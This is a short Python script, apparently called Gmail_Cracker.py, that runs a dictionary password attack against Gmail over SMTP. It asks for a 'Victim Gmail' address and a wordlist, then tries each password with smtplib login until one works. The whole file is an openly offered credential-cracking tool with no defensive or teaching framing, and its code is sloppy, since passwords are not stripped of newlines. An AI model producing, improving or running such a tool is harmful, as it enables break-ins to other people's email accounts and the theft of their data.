import smtplib

print("Put your wordlist in the same folder as Gmail_Cracker.py and name it dictionary") 
server = smtplib.SMTP("smtp.gmail.com", 587)
server.starttls()
user = raw_input("Enter The Victim Gmail : ")
dictionary = raw_input("put [dictionary.txt] : ")
passwdlist = open(dictionary, "r")
for password in passwdlist:
    try:
        server.login(user, password)
        print("password found : %s") %password
        break
    except smtplib.SMTPAuthenticationError:
        print("This is not the password : %s") %password

